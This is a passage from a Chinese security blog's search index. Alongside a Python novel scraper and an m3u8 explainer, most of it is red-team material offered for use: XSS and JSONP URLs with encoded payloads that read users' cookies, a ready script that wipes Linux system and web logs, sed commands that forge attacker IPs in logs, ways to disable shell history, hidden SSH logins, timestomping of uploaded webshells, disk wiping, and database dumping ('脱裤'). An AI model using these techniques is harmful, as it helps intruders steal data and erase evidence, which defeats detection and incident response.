&quot;need_bookinfo&quot;: 1    &#125;    data = json.dumps(data)    url = f&quot;https://dushu.baidu.com/api/pc/getChapterContent?data=&#123;data&#125;&quot;    async  with aiohttp.ClientSession() as session:        async with session.get(url) as resp:            dic = await resp.json()            # 文件异步读写            async with aiofiles.open(&quot;novel/&quot; + title, mode=&quot;w&quot;, encoding=&quot;utf-8&quot;) as f:                await f.write(dic[&#x27;data&#x27;][&#x27;novel&#x27;][&#x27;content&#x27;])async def getCatlog(url):    resp = requests.get(url)    dic = resp.json()    tasks = []    for item in dic[&#x27;data&#x27;][&#x27;novel&#x27;][&#x27;items&#x27;]:        title = item[&#x27;title&#x27;]        cid = item[&#x27;cid&#x27;]        # 准备异步任务        tasks.append(asyncio.create_task(aiodownload(cid, b_id, title)))    await asyncio.wait(tasks)if __name__ == &#x27;__main__&#x27;:    b_id = &quot;4306063500&quot;    url = &#x27;https://dushu.baidu.com/api/pc/getCatalog?data=&#123;&quot;book_id&quot;:&quot;&#x27; + b_id + &#x27;&quot;&#125;&#x27;    asyncio.run(getCatlog(url))\n\n​    一瞬间就好了\n综合训练-视频网站工作原理​    你现在想要做⼀个视频⽹站. 也有很多的UP猪帮你上传视频. OK, 作为服务器作者的你. 只需要把视频保存起来. 然后给出⼀个视频的链接即可. 然后在你的HTML代码中通过 video 标签引⼊即可.\n&lt;video src=&quot;1_1_爬⾍概述.mp4&quot;&gt;&lt;/video&gt;\n\n​    就可以了. 但是, 如果你这么做. 你的⽤户和⽼板⼀定会把你骂的狗⾎临头. 为什么呢? 假设你的视频是10个G的⾼清⽆码⼤资源. 那么此时, 你的⽤户和你⽼板将⾯临如下困境\n 1. ⽤户: 这个视频怎么加载的这么慢. 点击快进也快进不了. 太慢了. \n 1. ⽼板: 怎么这个⽉的流量费⼜这么⾼啊. \n\n​    视频那么⼤. 每次⽤户打开的时候. 可能只是差了最后⼏分钟没看呢. 那此时它必须把整个视 频都传输完毕. 才能看到他想看的那⾥. 等待时间肯定超⻓. ⽽每次都要把10G的⽂件进⾏⽹络传输. 流量费你懂的. \n​    但凡有点⼉经验的程序员肯定会想办法把⽤户上传好的视频进⾏转码(不同清晰度)做切⽚(ts)处理. 这样既⽅便⽤户进⾏⼤跨度的调整进度条(最⼩延迟). 也能为公司节省⼤量的流量费. 既然要把视频切成⾮常多个⼩碎⽚. 那就需要有个⽂件来记录这些视频播放的顺序和⼩碎⽚的路径. \n​    该⽂件⼀般为M3U⽂件. M3U⽂件中的内容经过UTF-8 的编码后, 就是M3U8⽂件. 今天, 我们看到的各⼤视频⽹站平台使⽤的⼏乎都是M3U8⽂件.\n\n​    那么抓取一个视频的流程如下：\n​    1、找到m3u8（各种手段）2、通过m3u8下载到ts文件 3、通过各种手段（不仅仅是编程手段）把ts文件合并为一个mp4文件\n","categories":["Python爬虫篇"],"tags":["Python","爬虫"]},{"title":"没用的小技巧(RED)","url":"/2022/08/07/%E6%B2%A1%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7-RED/","content":"防蜜罐插件​    蜜罐：\n​    1.配置jsonp接口信息\n​    2.配置蜜罐网站信息\n​            仿站(提供目标站点扒取页面静态文件,功能无法正常使用)\n​            二次修改后的源码(功能可用正常使用,但是所有数据全部为假数据,或者是精简以后的源码)\n​    3.等待踩蜜罐\n​    在配置蜜罐阶段的时候，其实就会将已经配置好的jsonp接口所生成的js文件(固定|动态)URL,插入到蜜罐中的静态文件里面.以此来达到只要你打开蜜罐网站,那么js将会自动加载并且执行调用所有jsonp接口的数据,然后将数据返回至后端.\n​    插件原理：判断网站域与jsonp接口请求的域是否是一个.\n​    地址：https://github.com/cnrstar/anti-honeypot\n\n一种针对热点的蜜罐​    这个蜜罐的溯源方式针对使用手机热点的红队人员。蜜罐直接获取攻击者手机号进行溯源。一抓一个准。各位红队人员小心为妙。\n​    首先打开网站，他会监控是否开启了F12控制台，如果开启了调试模式的话，溯源代码会停止加载。\n​    另外，针对使用burp的用户。小心你们的burp版本是否存在chrome的漏洞。\n​    沙箱的特征如下，直接加载js\n\n​    fofa上面可以直接搜索到142多条\n\n​    重点获取手机号js代码，可以看到会获取三大运营商的手机信息\n\n​    解密如下\n​    获取联通的接口\n\n​    如果获取到手机号码的话，会将加密的手机号上传\n\n​    另外其他溯源接口如下\nhttps://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.4515320024420155https://bbs.zhibo8.cc/user/userinfo?device=pc&amp;_=1584613345023&amp;callback=jcbDNoDtQbW&amp;callback=callback_165893378313192912https://myjr.suning.com/sfp/mutualTrust/getLoginInfo.htm?callback=getphonehttps://myjr.suning.com/sfp/headPic/getEgoMemberHeadPicUrl.htmhttps://ajax.58pic.com/58pic/index.php?m=adManageSystem&amp;a=showAdDeliveryForPosition&amp;callback=%3Cscript%3Eeval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoicWlhbnR1IiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgicXRfdWlkIil9fSwnKicpOw==%27))%3C/script%3E&amp;position=31&amp;keyword=XXX&amp;_=1590829943379https://my.zol.com.cn/public_new.phphttps://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.04630644674906281https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&amp;vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&amp;getannual=1&amp;geticon=1&amp;getsvip=1&amp;otype=json&amp;callback=jQuery19104991404611435173_1562551736901&amp;uin=a&amp;t=1&amp;getadpass=0&amp;g_tk=a&amp;g_vstk=a&amp;g_actk=&amp;_=15625517369020.38244545320223655http://my.zol.com.cn/public_new.phphttps://loginst.suning.com/authStatus?callback=getuidhttps://www.fhyx.com/account/login.html?redirecturl=%22%3E%3CSCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/SCrIpT%3Ehttps://so.u17.com/all/%22%3C/span%3E%250a%3Cimg%2520src=1%20onerror=%22document.body.innerHTML=location.search;document.body.innerHTML=document.body.innerText;%22%3E%250a%22/m0_p1.html?&amp;lt;img/src=&amp;quot;x&amp;quot;/onerror=a=eval;a(atob(unescape(location.hash.slice(1))))&amp;gt;https://i.vip.iqiyi.com/client/store/pc/checkout.action?platform=b6c13e26323c537d&amp;fs=&amp;fsSign=&amp;fc=&amp;fv=&amp;qc005=&amp;P00001=&amp;pid=adb3376b039b970b&amp;vipType=2&amp;aid=&amp;device_id=&amp;callback=callback_165893378307001282https://login.sina.com.cn/sso/login.php?client=&amp;service=&amp;client=&amp;encoding=&amp;gateway=1&amp;returntype=TEXT&amp;useticket=0&amp;callback=sina2&amp;_=1577938268947&amp;callback=callback_165893378307919803https://v-api-plus.huya.com/jsapi/getUserInfo?callback=jQuery1111007865243652615272_1628490347897&amp;_=1628490347898&amp;callback=callback_165893378306693233http://mapp.jrj.com.cn/pc/content/getMqNews?vname=%3Csvg%20onload=eval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoianJqIiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgibXlqcmpfdXNlcmlkIil9fSwnKicpOw==%27))%3Ehttps://www.ixueshu.com/index.html?v=1608893853571&amp;template=sys_login_ajax.html&amp;_url=123123123%22%22%3E%3CsCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/sCrIpT%3Ehttps://hackit.me/v.qq.com/https://api.csdn.net/oauth/authorize?client_id=1000001&amp;redirect_uri=http://www.iteye.com/auth/csdn/callback&amp;response_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient_id%3D1000001%26redirect_uri%3Dhttp%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E\n\n\nLinux痕迹清理​     #管理员   $普通用户   /表示根目录   ~表示当前用户家目录\n日志文件\n\n\n命令\n日志文件\n功能\n\n\n\nw,who\n/var/run/utmp\n记录当前正在登录系统的用户信息，uptime记录系统启动时间\n\n\nlast\n/var/log/wtmp\n所有成功登录/登出的历史记录\n\n\nlastb\n/var/log/btmp\n登录失败尝试\n\n\nlastlog\n/var/log/lastlog\n最近登录记录\n\n\n​    这些日志都是以二进制形式存储。\n\n\n\n日志\n作用\n\n\n\n/var/log/secure\n记录与安全相关的日志信息，涉及使用账户和密码登录的程序都会记录\n\n\n/var/log/auth.log\n需要身份确认的操作\n\n\n/var/log/messages\n记录系统启动后的信息和错误日志\n\n\n/var/log/cron\n记录定时任务相关的日志信息\n\n\n/var/log/spooler\n记录UUCP和news设备相关的日志信息\n\n\n/var/log/boot.log\n记录守护进程启动和停止相关的日志消息\n\n\n清除方法方案一直接清空：&gt; /var/log/utmp&gt; /var/log/wtmp&gt; /var/log/btmp&gt; /var/log/lastlog\n\n​    不留下任何痕迹，但是特征也很明显，容易被察觉，一般不推荐使用。将日志文件全部删除即将空字符写入日志文件，需要root权限，有五种命令可以实现：\ncat /dev/null &gt; filename: &gt; filename&gt; filenameecho &quot;&quot; &gt; filenameecho &gt; filename\n\n​    区别：前三种命令清空文件后文件大小为0，后两种命令清空文件后会留下一个换行符，文件大小为1byte。\n方案二部分删除：​    对于文本格式的日志文件，可以直接进入文件进行删改，也可以利用流编辑命令sed删除文件中匹配的行：\n# 删除所有匹配到字符串的行，比如自己的登录ipsed -i &#x27;/ip/d&#x27; /var/log/messages# 全局替换登录IP地址：sed -i &#x27;s/ip1/ip2/g&#x27; /var/log/auth.log\n\n​    对于二进制日志文件，部分删除需要使用utmpdump命令，utmpdump可以将wtmp和utmp转换为文本文件，将文本文件编辑修改后恢复成二进制文件即可，如下面针对wtmp进行修改：\n# 将二进制日志文件转换为可编辑的文本文件utmpdump /var/log/wtmp &gt;/var/log/wtmp.file# 对文本文件进行编辑和修改# 将编辑修改后的文本文件转换为二进制日志文件utmpdump -r &lt; /var/log/wtmp.file &gt; /var/log/wtmp\n\n方案三隐藏登陆：​    从应用层面通过参数选择隐藏记录，如ssh远程隐藏登录：\n​    登录时不分配伪终端，不会记录在utmp、wtmp、btmp中，不会被w、who、users、last、lastb命令发现：\nssh -T root@192.168.126.1 /bin/bash -i# -T：不分配伪终端# -i：bash的参数，表示交互式shell\n\n​    登录时不将ssh公钥保存在本地.ssh目录中：\nssh -o UserKnownHostsFile=/dev/null -T root@192.168.126.2 /bin/bash –i# -o：options选择信息\n\n注：使用ps命令可以查看到ssh隐藏登录的进程\nHistory记录​    查看历史操作命令：\nhistory\n\n​    history显示内存和~/.bash_history中的所有内容；\n​    内存中的内容并没有立刻写入~/.bash_history，只有当当前shell关闭时才会将内存内容写入shell。\n清除history历史命令记录​    1、编辑history记录文件，删除部分不想被保存的历史命令。\nvim ~/.bash_history\n\n​    2、清除当前用户的history命令记录。\nhistory -c  # 删除内存中的所有命令历史history -r  # 删除当前会话历史记录\n\n​    3、利用vim特性删除历史命令。\n\\#使用vim打开一个文件vi test.txt# 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。:set history=0# 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令：vsp ~/.bash_history# 清楚保存.bash_history文件即可。\n\n​    4、在vim中执行自己不想让别人看到的命令。\n:set history=0:!command\n\n​    特别的可以运行**:!bash来启动一个bash shell并执行命令，不需要退出vim（最后还要删除VIM所产生的日志文件噢，kali里面是.viminfo，在vim中使用rm -rf**强制清除）。\n不记录history历史命令​    1、通过修改配置文件/etc/profile，使系统不再保存命令记录。\nHISTSIZE=0\n\n​    2、登录后执行下面命令,不记录历史命令(.bash_history)\nunset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0\n\n一键清除history和系统日志脚本#!/usr/bin/bashecho &gt; /var/log/syslogecho &gt; /var/log/messagesecho &gt; /var/log/httpd/access_logecho &gt; /var/log/httpd/error_logecho &gt; /var/log/xferlogecho &gt; /var/log/secureecho &gt; /var/log/auth.logecho &gt; /var/log/user.logecho &gt; /var/log/wtmpecho &gt; /var/log/lastlogecho &gt; /var/log/btmpecho &gt; /var/run/utmprm ~/./bash_historyhistory -c\n\n清除web日志痕迹​    web日志同样可以使用sed进行伪造，例如apache日志、MySQL日志、php日志\nsed &#x27;s/192.168.100.101/10.0.0.55/g&#x27; –i /var/log/apache/access.logsed &#x27;s/192.168.100.101/10.0.0.55/g&#x27; –i /var/log/apache/error_logsed &#x27;s/192.168.100.101/10.0.0.55/g&#x27; –i /var/log/mysql/mysql_error.logsed &#x27;s/192.168.100.101/10.0.0.55/g&#x27; –i /var/log/mysql/mysql_slow.logsed &#x27;s/192.168.100.101/192.168.1.4/g&#x27; –i /var/log/apache/php_error.log\n\n​    清除部分相关日志：\n# 使用grep -v来把我们的相关信息删除cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log# 把修改过的日志覆盖到原日志文件cat tmp.log &gt; /var/log/nginx/access.log/\n\n\nLinux文件伪装伪装与隐藏修改时间戳​    Linux文件时间戳包括三种，用stat filename命令查看：\n访问时间(access time，atime)：文件内容最后一次被读取的时间，如用cat、more命令查看文件修改时间(modify time，mtime)：文件内容最后一次被修改的时间，如用vim编辑器修改文件内容改变时间(change time，ctime)：文件属性被最后一次被修改的时间，inode节点信息被修改时间（大小、属组、属主、权限），如用chmod、chown命令修改文件属性，或修改文件内容\n\n\n​    ls -l命令查看的是文件最后一次被修改的时间mtime。\n​    上传工具或木马文件后，要将其修改为和当前目录中文件相近的时间，利用touch命令进行修改atime和mtime（不能修改ctime），命令参数如下\n-m：等同于–time=mtime，修改mtime-a：等同于–time=atime，修改atime-t：时间戳修改为指定时间[[CC]YY]MMDDhhmm[.ss]，如果不指定时间戳，则默认时间为当前时间-d：时间戳修改为指定字符串，如&quot;2020-12-12 12:12:12.00&quot;，如果不指定时间戳，则默认时间为当前时间-r file：等同于–reference=file，时间戳修改为与file相同\n\n​    注意：-d和-t参数都有指定时间戳的功能，但是-t参数只能精确到秒，使用stat查看文件很容易看出破绽，使用-d参数更加精确隐蔽。\n\n# 将3.aspx的atime和mtime修改为&quot;2020-12-12 12:12:12&quot;touch -t 202012121212.12 3.aspx# 将3.aspx的mtime修改为&quot;2020-12-12 12:12:12.8731390581&quot;touch -m -d &quot;2020-12-12 12:12:12.831390581&quot; 3.aspx# 首先将3.aspx的atime和mtime时间戳备份，待修改3.aspx后，再将其时间戳恢复touch temp -r 3.aspxvim 3.aspxtouch 3.aspx -r temprm temp \n\n文件隐藏​    Linux中以.开头命名的文件或文件夹即为隐藏文件，因此要隐藏某个文件或文件夹直接将其名字前加一个.就可以了。\n​    查看所有文件（包括隐藏文件）可以用ls -a命令，只查看隐藏文件可以用ls -d .*命令。\n\n文件属性需要修改的文件属性除了时间戳，主要还包括所属用户/组、读写权限等，常见命令如下：\n\n​    1、chown：修改文件所属用户，chown [options] [user][:[group]] file\n​    2、chgrp：修改文件所属组，chgrp [options] [group] file\n​    3、chmod：修改文件读/写/执行权限，有两种命令：\nchmod [options] mode[,mode] file，其中mode为[ugoa][-+=][rwx]，具体含义为：u/g/o/a：user文件的所属用户/group文件的所属组/others其他用户/all所有用户及用户组-/+/=：权限的去除/添加/设置r/w/x：读/写/执行chmod [options] octal-mode file，rwx对应各自权重，分别为二进制100、010、001，即421比如以下这两句命令是等同的：chmod u=rwx,g=rx,o=r test.txt、chmod 754 test.txt\n\n​    以上三种命令options有一个共同的参数-R：递归改变该目录及其子目录中的文件。\n文件擦除​    为避免数据被恢复，对于敏感文件和工具，不应使用常规的rm、rmdir删除命令，而应使用覆写删除命令进行删除：\nshred命令实现安全的从硬盘上擦除数据，命令格式为：shred [options] file，options具体参数如下：\n-f, --force：必要时修改权限以使目标可写-n, --iterations=N：覆盖N次，不指定次数则默认3 次-s, --size=N：将文件内容粉碎为指定字节大小的碎片(可使用K、M 和G 作为单位)-u, --remove：覆盖后截断并删除文件-v, --verbose：显示详细信息-z, --zero：最后一次使用ascii的0x00进行覆盖以隐藏覆盖动作\n\n# 将test1覆写6次后再填0x00，最后将其删除shred -zufvn 6 1.txt\n\n\ndd命令​    dd命令通常用来备份、恢复、转换磁盘上的分区和文件，也可以实现安全擦除数据，命令格式为：dd options，options包括：\nif=file：输入文件名，缺省为标准输入of=file：输出文件名，缺省为标准输出ibs=size：读入块大小为size bytesobs=size：写出块大小为size bytesbs=size：同时设置读写块的大小为size bytescount=N：仅拷贝N个块，每块的大小为size bytes\n\n​    size单位默认为byte，同时也可以使用K、M、G为单位。常使用方法如下：\n​    全盘数据备份：\ndd if=/dev/sda1 of=~/image\n\n​    备份磁盘开始的512个字节大小的MBR信息到指定文件：\ndd if=/dev/sda1 of=~/image bs=512 count=1 \n\n​    利用0填充销毁磁盘数据：\ndd if=/dev/zero of=/dev/hda1\n\n​    利用随机数填充销毁文件数据，文件大小为1K，覆写6次：\ndd if=/dev/urandom of=~/test bs=1k count=6 \n\n\nWindows入侵痕迹清理1\n\n数据库相关mysql -h ip -P 3306 -u root -p\n\n​    收录一些判断数据库和表大小的方法，以及一些语句。\n​    首先打开数据库的日志记录\nshow variables like &#x27;%general%&#x27;;\n\n\n​    开启日志\nSET GLOBAL general_log = &#x27;On&#x27;;\n\n​    更换位置\nSET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;\n\n\n​    我们查看日志可以看到连接ip信息等\n\n查看数据库大小​    查询所用数据库总大小\nuse information_schema;select concat(round(sum(DATA_LENGTH/1024/1024),2),&#x27;MB&#x27;) as data from TABLES;\n\n\n​    查看指定数据库每一个表容量大小:\nselect table_schema as &#x27;数据库&#x27;, table_name as &#x27;表名&#x27;,table_rows as &#x27;记录数&#x27;,truncate(data_length/1024/1024, 2) as &#x27;数据容量(MB)&#x27;,truncate(index_length/1024/1024, 2) as &#x27;索引容量(MB)&#x27; from information_schema.tables where table_schema=&#x27;mysql&#x27; order by data_length desc, index_length desc;\n\n\n​    查看指定单个数据库容量大小：\nselect table_schema as &#x27;数据库&#x27;, sum(table_rows) as &#x27;记录数&#x27;, sum(truncate(data_length/1024/1024, 2)) as &#x27;数据容量(MB)&#x27;, sum(truncate(index_length/1024/1024, 2)) as &#x27;索引容量(MB)&#x27; from information_schema.tables where table_schema=&#x27;mysql&#x27;;\n\n\n​    查询每个裤总容量：\nselect table_schema as &#x27;数据库&#x27;, sum(table_rows) as &#x27;记录数&#x27;,sum(truncate(data_length/1024/1024, 2)) as &#x27;数据容量(MB)&#x27;,sum(truncate(index_length/1024/1024, 2)) as &#x27;索引容量(MB)&#x27; from information_schema.tables group by table_schema order by sum(data_length) desc, sum(index_length) desc;\n\n\n脱裤备份🫣​    脱某个数据库 ，不需要进入数据库：\nLinux语法：mysqldump -h主机名 -P 端口 -u用户名 -p密码 --databases 数据库名 &gt; 文件名.sql 例子：mysqldump -h 192.168.10.25 -P 3306 -uroot -proot --databases mysql &gt; /data/backup/www.sql;Windows语法：mysqldump -h1主机名 -p端口 -u用户名 -密码 库名  &gt; 文件名.sql例子：mysqldump -h127.0.0.1 -p3306 -uroot -proot mysql  &gt; 111.sql\n\n​    以上的命令在mysql5.6以下是可以执行的，5.6以上会报错\n\n​    虽然warning了，但是我们看到已经成功执行，看看内容。\n\n\n​    \n​    如果不想显示我们有shell，那么在修改配置文件/etc/mysql/my.cnf\n[mysqldump] user=rootpassword=&quot;mima&quot;\n\n​    然后直接执行\nmysqldump 库名 表名 &gt; /data/bak/表_2022-06-09.sql\n\n​    如果没有的话，我们可以选择navicat的数据导出\n\n\nInit DB \ttestQuery\t\t\tSHOW FULL COLUMNS FROM `test_table`\n\n​    在日志上也只有这两行。如果使用mysqldump则记录很多，下面是搜到的小技巧：\n# 备份全部数据库（包含存储过程、自定义函数及事件）mysqldump -uroot -pxxxxxx --single-transaction -R -E --all-databases &gt; /tmp/all_database.sql# 要求记录 binlog 位点信息 可用于搭建从库mysqldump -uroot -pxxxxxx --single-transaction -R -E --all-databases --master-data=2 &gt; /tmp/all_database.sql# 备份指定数据库mysqldump -uroot -pxxxxxx --single-transaction -R -E --databases db1 &gt; /tmp/db1.sqlmysqldump -uroot -pxxxxxx --single-transaction -R -E --databases db1 db2 &gt; /tmp/db1_db2.sql# 备份部分表mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 &gt; /tmp/tb1.sqlmysqldump -uroot -pxxxxxx --single-transaction db1 tb1 tb2 tb3 &gt; /tmp/tb.sql# 导出某个表，数据以单行insert显示mysqldump -uroot -pxxxxxx --single-transaction --skip-extended-insert db1 tb1 &gt; /tmp/tb1.sql# 导出单表的部分数据mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 --where=&quot; create_time &gt;= &#x27;2021-06-01 00:00:00&#x27; &quot; &gt; /tmp/tb1.sqlmysqldump -uroot -pxxxxxx --single-transaction db1 tb1 --where=&#x27;id &lt; 10&#x27; &gt; /tmp/tb1.sql# 排除某些表导出mysqldump -uroot -pxxxxxx --single-transaction --databases db1 --ignore-table=db1.tb1 --ignore-table=db1.tb2 &gt; /tmp/db1.sql# 只导出结构或只导出数据mysqldump -uroot -pxxxxxx db1 --no-data &gt; /tmp/db1_jiegou.sqlmysqldump -uroot -pxxxxxx db1 --no-create-info &gt; /tmp/db1_data.sql# 只导出某个库的存储过程及自定义函数mysqldump -uroot -pxxxxxx -d -t -R db1 &gt; /tmp/db1_routine.sql# 远程导出 即MySQL服务端不在本地mysqldump -uroot -pxxxxxx -hxxx.xxx.xx -P3306 --single-transaction --databases db1 &gt; /tmp/db1.sql\n\n​    下面根据网上的资源简单分析：\n​    mysqldump的大概流程整理如下（白话）：​    1：连接数据库，校验账户，密码，IP​    2：进入INFORMATION_SCHEMA库，获取要备份的数据库的信息，包含存储过程，视图，表​    3：进入INFORMATION_SCHEMA库，获取每个表的字段名称，字段类型等信息​    4：查询每个表的数据，select SQL_NO_CACHE from tbname​    5：拼接成DDL SQL​    6：写入备份文件\n1.FLUSH /!40101 LOCAL / TABLES 关闭所有在内存中打开的表，清理查询缓存。2.FLUSH TABLES WITH READ LOCK 加一个全局读锁，只允许读，不允许更新操作。3.SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ 设置当前会话的事务隔离等级为RR，RR可避免不可重复读和幻读，保证在备份期间，一个事务中所有相同的查询读取到同样的数据。4.START TRANSACTION /!40100 WITH CONSISTENT SNAPSHOT / 获取当前数据库的快照，这个是由mysqldump中–single-transaction决定的,类似于开启事务并对所有表执行了一次SELECT操作，这样可保证备份时，在任意时间点执行select * from table得到的数据和执行START TRANSACTION WITH CONSISTENT SNAPSHOT时的数据一致。5.SHOW MASTER STATUS –master-data决定的，记录了开始备份时，binlog的状态信息，包括MASTER_LOG_FILE和MASTER_LOG_POS6.UNLOCK TABLES 释放锁，也就是说其实mysqldump这个语句，其实是有锁表，只不过锁了很短的时间7.SHOW CREATE DATABASE IF NOT EXISTS test 生成创库语句。8.SAVEPOINT sp 设置SAVEPOINT，然后备份完每个表后再回滚到该SAVEPOINT。9.show create table test 生成创表语句10.SELECT /!40001 SQL_NO_CACHE / * FROM test 该语句会查询到表test1的所有数据，在备份文件中会生成相应的insert语句。 其中SQL_NO_CACHE的作用是查询的结果并不会缓存到查询缓存中。11.SHOW TRIGGERS LIKE &#x27;test&#x27;； 备份触发器。12.ROLLBACK TO SAVEPOINT sp 如果不执行ROLLBACK TO SAVEPOINT sp，可能会阻塞同时进行的DDL操作，执行了该语句后，DDL操作可以继续执行。13.SHOW FUNCTION STATUS WHERE Db = &#x27;test&#x27; SHOW CREATE FUNCTION mycat_seq_currval SHOW PROCEDURE STATUS WHERE Db = &#x27;test&#x27; 用于备份存储过程和函数\n\n#首先连接到数据库connect2022-08-30T05:10:08.409166Z\t  123 Connect\troot@loacalhost on  using Socket2022-08-30T05:10:08.409796Z\t  123 Query\t/*!40100 SET @@SQL_MODE=&#x27;&#x27; */2022-08-30T05:10:08.410370Z\t  123 Query\t/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */2022-08-30T05:10:08.410941Z\t  123 Query\tSHOW VARIABLES LIKE &#x27;gtid\\_mode&#x27;2022-08-30T05:10:08.413782Z\t  123 Query\tSELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;UNDO LOG&#x27; AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;DATAFILE&#x27; AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN (&#x27;test&#x27;))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME2022-08-30T05:10:08.416628Z\t  123 Query\tSELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = &#x27;DATAFILE&#x27; AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN (&#x27;test&#x27;)) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME2022-08-30T05:10:08.418387Z\t  123 Query\tSHOW VARIABLES LIKE &#x27;ndbinfo\\_version&#x27;2022-08-30T05:10:08.420250Z\t  123 Init DB\ttest2022-08-30T05:10:08.420786Z\t  123 Query\tSHOW CREATE DATABASE IF NOT EXISTS `test`2022-08-30T05:10:08.421379Z\t  123 Query\tshow tables2022-08-30T05:10:08.422627Z\t  123 Query\tLOCK TABLES `test_table` READ /*!32311 LOCAL */2022-08-30T05:10:08.423269Z\t  123 Query\tshow table status like &#x27;test\\_table&#x27;2022-08-30T05:10:08.424678Z\t  123 Query\tSET SQL_QUOTE_SHOW_CREATE=12022-08-30T05:10:08.425241Z\t  123 Query\tSET SESSION character_set_results = &#x27;binary&#x27;2022-08-30T05:10:08.425818Z\t  123 Query\tshow create table `test_table`2022-08-30T05:10:08.426554Z\t  123 Query\tSET SESSION character_set_results = &#x27;utf8&#x27;2022-08-30T05:10:08.427116Z\t  123 Query\tshow fields from `test_table`2022-08-30T05:10:08.428382Z\t  123 Query\tshow fields from `test_table`2022-08-30T05:10:08.429591Z\t  123 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `test_table`2022-08-30T05:10:08.430238Z\t  123 Query\tSET SESSION character_set_results = &#x27;binary&#x27;2022-08-30T05:10:08.430767Z\t  123 Query\tuse `test`2022-08-30T05:10:08.431325Z\t  123 Query\tselect @@collation_database2022-08-30T05:10:08.431900Z\t  123 Query\tSHOW TRIGGERS LIKE &#x27;test\\_table&#x27;2022-08-30T05:10:08.433084Z\t  123 Query\tSET SESSION character_set_results = &#x27;utf8&#x27;2022-08-30T05:10:08.433627Z\t  123 Query\tUNLOCK TABLES2022-08-30T05:10:08.436134Z\t  123 Quit\n\n​    我们看到，他会将数据库所有的表做LOCK TABLE，所有表导出完成，才会执行UNLOCK TABLES，因此在导出过程中所有的表都禁止操作。\n​    还有另外两种办法我们也同时看看好了，开发常用，脱裤无所谓了🥵。\nmysqldump -udumper -pdumper --lock-all-tables test\n\n2021-06-03T10:31:37.989701+08:00   1892 Query  show variables like &#x27;log_output&#x27;2021-06-03T10:32:08.981051+08:00   1892 Query  show variables like &#x27;general_log&#x27;2021-06-03T10:32:39.291966+08:00   1892 Quit  2021-06-03T10:33:06.146784+08:00   1893 Connect  root@localhost on  using Socket2021-06-03T10:33:06.146963+08:00   1893 Query  /*!40100 SET @@SQL_MODE=&#x27;&#x27; 